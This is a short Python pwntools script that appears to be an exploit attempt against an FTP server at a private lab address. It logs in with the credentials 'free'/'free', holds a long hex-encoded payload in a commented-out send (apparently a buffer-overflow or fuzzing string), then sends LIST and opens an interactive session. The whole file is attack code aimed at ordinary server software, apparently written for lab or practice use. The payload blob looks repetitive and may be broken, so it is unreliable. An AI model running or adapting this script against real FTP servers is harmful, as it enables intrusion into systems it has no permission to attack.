#!/usr/bin/python
# -*- coding: UTF-8 -*-

from pwn import *

context.log_level = "debug"
p = remote("192.168.245.135", 21)

p.send("USER free\r\n")

p.recvuntil("password")
p.send("PASS free\r\n")

p.recvuntil("successful")

# p.send("524dc41f7f414191bd628f56aa699f641d3b76078fa2f87f7f7f7f7f7f7f787a7f7f3f3f3f3f3f3f41414191bd628f56aa699f641d3b76078fa2f83f3f41414191bd628f56aa699f641d3b76078fa2f81d3b76078fa2f8ea59fb27ab73f83c4d0c36284fbffa6be68b7c65f5cc46d72f8da886301591fa80e914f08e7d91dd2ce3613f59fb27ab73f83c4d0c36284fbffa6be68b7c65f5cc46d72f8da886301591fa80e914f08e7d91dd2ce3613f3f3f3fbb1bfcb0364bdf4141a2f87f7f7f7f7f7f7f7f7f7f7f3f3f3f3f3f3f41414191bd628f56aa699f641d3b76078fa2f8ea59fb27ac73f83c4d0c36284fbffa6be68b7c65f5cc46d72f8da886301591fa80347f040f742636d8f095347f040fff7f8b2355ea135f488a45ba7d6f9b8c3fec622eb3c59a83a0ceada49745691c23699f641d3b76078f4141414141410d0a57784b2f8da886301591fa80e914f08e7d91dd2ce3613f59fb27ab73f83c4d0c36284fbffa6be68b7c65f5cc46d72f8da886301591fa80e914f08e7d91dd2ce3613f3f3f3fbb1bfcb0364bdf4141a2f87f7f7f7f7f7f7f7f7f7f7f3f3f3f3f3f3f41414191bd628f56aa699f641d3b76078fa2f8ea59fb27ac73f83c4d0c36284fbf2ce3613f59fb27ab73f83c4d0c36284fbffa6be68b7c65f5cc46d72f8da886301591fa80e914f08e7d91dd2ce3613f3f3f3fbb1bfcb0364bdf4141a2f87f7f7f7f7f7f7f7f7f7f7f3f3f3f3f3f3f41414191bd628f56aa699f641d3b76078fa2f8ea59fb27ac73f83c4d0c36284fbffa6be68b7c65f5cc46d72f8da886301591fa80347f040f742636d8f095347f040fff7f8b2355ea135f488a45ba7d6f9b8c3fec622eb3c59a83a0ceada49745691c23fa6be68b7c65f5cc46d72f8da886301591fa80347f040f742636d8f095347f040fff7f8b2355ea135f488a45ba7d6f9b8c3fec622eb3c59a83a0ceada49745691c23699f641d3b7607".decode("hex"))

p.send("LIST \r\n")
p.interactive()
